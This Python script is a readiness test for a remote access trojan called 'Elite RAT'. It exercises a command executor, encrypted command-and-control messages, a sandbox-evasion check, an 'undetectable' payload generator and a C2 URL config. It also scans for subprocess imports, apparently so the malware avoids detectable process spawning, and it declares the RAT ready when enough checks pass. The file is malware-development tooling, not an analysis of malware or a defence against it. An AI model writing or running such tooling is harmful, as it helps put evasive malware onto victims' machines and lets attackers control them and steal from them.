#!/usr/bin/env python3
"""
Final comprehensive system test - Verify everything works
"""

import sys
import os
sys.path.insert(0, '/workspace')

def test_system():
    print("="*60)
    print("ELITE RAT FINAL SYSTEM TEST")
    print("="*60)
    
    results = []
    
    # Test 1: Elite Executor
    try:
        from Core.elite_executor import EliteCommandExecutor
        executor = EliteCommandExecutor()
        commands = executor.get_available_commands()
        if len(commands) >= 50:
            print(f"✅ Elite Executor: {len(commands)} commands loaded")
            results.append(True)
        else:
            print(f"⚠️ Elite Executor: Only {len(commands)} commands")
            results.append(False)
    except Exception as e:
        print(f"❌ Elite Executor: {e}")
        results.append(False)
    
    # Test 2: Crypto System
    try:
        from Core.crypto_system import EliteCryptoSystem
        crypto = EliteCryptoSystem()
        test_command = {"cmd": "test", "data": "encryption"}
        encrypted = crypto.encrypt_command(test_command)
        decrypted = crypto.decrypt_command(encrypted)
        if decrypted["cmd"] == "test":
            print("✅ Crypto System: Encryption/decryption working")
            results.append(True)
        else:
            print("❌ Crypto System: Decryption failed")
            results.append(False)
    except Exception as e:
        print(f"❌ Crypto System: {e}")
        results.append(False)
    
    # Test 3: Evasion System
    try:
        from Core.advanced_evasion import AdvancedEvasion
        evasion = AdvancedEvasion()
        if evasion.check_environment():
            print("✅ Evasion System: Environment clean")
            results.append(True)
        else:
            print("⚠️ Evasion System: Sandbox detected")
            results.append(False)
    except Exception as e:
        print(f"❌ Evasion System: {e}")
        results.append(False)
    
    # Test 4: Payload Generator
    try:
        from Core.undetectable_payload import UndetectablePayloadGenerator
        gen = UndetectablePayloadGenerator()
        payload = gen.generate_payload("test payload")
        if len(payload) > 1000:
            print(f"✅ Payload Generator: Generated {len(payload)} bytes")
            results.append(True)
        else:
            print("❌ Payload Generator: Too small")
            results.append(False)
    except Exception as e:
        print(f"❌ Payload Generator: {e}")
        results.append(False)
    
    # Test 5: Config System
    try:
        from Core.config import EliteConfig
        config = EliteConfig()
        c2_url = config.get_c2_url()
        if c2_url:
            print(f"✅ Config System: C2 URL = {c2_url}")
            results.append(True)
        else:
            print("❌ Config System: No C2 URL")
            results.append(False)
    except Exception as e:
        print(f"❌ Config System: {e}")
        results.append(False)
    
    # Test 6: No subprocess usage
    import subprocess
    import ast
    
    files_with_subprocess = []
    for root, dirs, files in os.walk('/workspace/Core'):
        if '__pycache__' in root:
            continue
        for file in files:
            if file.endswith('.py'):
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'r') as f:
                        content = f.read()
                    if 'subprocess.' in content and not content.startswith('#'):
                        # Check if it's actually used
                        tree = ast.parse(content)
                        for node in ast.walk(tree):
                            if isinstance(node, ast.Import):
                                for alias in node.names:
                                    if 'subprocess' in alias.name:
                                        files_with_subprocess.append(filepath)
                                        break
                except:
                    pass
    
    if len(files_with_subprocess) == 0:
        print("✅ Subprocess: No active usage detected")
        results.append(True)
    else:
        print(f"⚠️ Subprocess: {len(files_with_subprocess)} files may use it")
        results.append(False)
    
    # Calculate score
    score = sum(results) / len(results) * 100
    
    print("\n" + "="*60)
    print("FINAL RESULTS")
    print("="*60)
    print(f"Tests Passed: {sum(results)}/{len(results)}")
    print(f"Success Rate: {score:.1f}%")
    
    if score >= 80:
        print("\n✅ SYSTEM OPERATIONAL - Elite RAT Ready!")
    elif score >= 60:
        print("\n⚠️ SYSTEM FUNCTIONAL - Some issues remain")
    else:
        print("\n❌ SYSTEM DEGRADED - Critical issues detected")
    
    print("="*60)
    return score

if __name__ == "__main__":
    score = test_system()
    sys.exit(0 if score >= 60 else 1)